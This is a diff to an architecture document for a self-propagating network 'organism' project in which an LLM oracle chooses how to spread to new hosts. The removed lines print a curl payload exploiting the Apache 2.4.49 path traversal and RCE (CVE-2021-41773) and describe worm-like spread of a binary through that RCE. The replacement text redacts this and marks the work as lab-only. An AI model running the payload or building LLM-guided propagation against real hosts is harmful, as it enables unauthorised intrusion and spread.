@@ -302,25 +302,7 @@ lim_{propagation_vectors→∞} P(reach | B.ssh=closed, B.port_80=open) → 1
 
 As long as the propagation vector set is fixed (SSH only), the reachability probability for B is zero regardless of how many times the organism probes. The paradox: origin (A with a running agent) and destination (B with an accessible port) are causally connected by a network path that the organism cannot traverse with its current capabilities.
 
-The LLM oracle resolves this by treating the problem as a **context-aware propagation strategy query**:
-
-```
-Input:  DiscoveryQuery {
-    target_ip:       "10.60.20.10",
-    open_ports:      [80, 443],
-    ssh_open:        false,
-    banner:          "Apache/2.4.49",
-    os_hint:         "Linux",
-    current_node_ip: "10.60.10.10",
-}
-
-Output: PropagationStrategy {
-    method:          Exploit { cve: "CVE-2021-41773", port: 80 },
-    confidence:      0.92,
-    bootstrap:       "curl http://10.60.20.10/cgi-bin/.%2e/%2e%2e/bin/sh -d 'echo Content-Type: text/plain; ...'",
-    rationale:       "Apache 2.4.49 path traversal + mod_cgi RCE via port 80",
-}
-```
+The LLM oracle is planned to resolve this by treating the problem as a **context-aware propagation strategy query**: given a target's observed open ports, service banners, and OS hints, the oracle returns a scored propagation strategy. The full design is lab-only, safety-gated, and blocked on the threat-model review in Issue #106.
 
 ### `physarum-llm` crate (Issue #106)
 
@@ -358,15 +340,9 @@ vLLM             http://<host>:8000/v1           optional
 --llm-timeout-ms  10000                       per-request timeout
 ```
 
-### Planned PoC lab — CVE-2021-41773
+### Planned PoC lab (Issue #106)
 
-```
-terraform-vuln/
-├── host-vuln.sh.tpl    Apache 2.4.49 + mod_cgi, port 80 only, SSH closed
-└── main.tf             isolated VPC; no SSH SG rule on vuln host
-```
-
-The organism reaches host-vuln via port 80 using the LLM-generated exploit, propagates the maze binary via the RCE, and records the path in lineage. Proof of concept that the paradox is resolved.
+An isolated `terraform-vuln/` environment is planned to validate the paradox resolution. The lab is safety-gated: no SSH on the target host, isolated VPC, lab-only scope. Details are tracked in Issue #106 pending threat-model review.
 
 ---
 
@@ -441,7 +417,7 @@ All AWS resources are destroyed after each lab run. No persistent infrastructure
 | `README.md` (root) | High-level vision, status table, quick start |
 | `General-Docs/ARCHITECTURE.md` (this file) | Full system architecture across all generations |
 | `General-Docs/QUALITY_GATE.md` | Gate definitions, acceptance criteria, evidence links |
-| `General-Docs/PROTOTYPE_ROADMAP.md` | Phased implementation plan and milestone history |
+| `General-Docs/QUALITY_GATE.md` + GitHub Issues/PRs | Milestone history and gate evidence — authoritative record |
 | `General-Docs/ROLE_FLUID_AGENT_ARCHITECTURE.md` | eBPF direction + role-fluid agent design intent |
 | `General-Docs/EBPF_FLOW_OBSERVATION_DESIGN.md` | eBPF Stage 0 design (Aya stack, tracepoint, sidecar) |
 | `General-Docs/INSIGHTS_AND_BRAINSTORM.md` | Exploratory ideas — not authoritative |
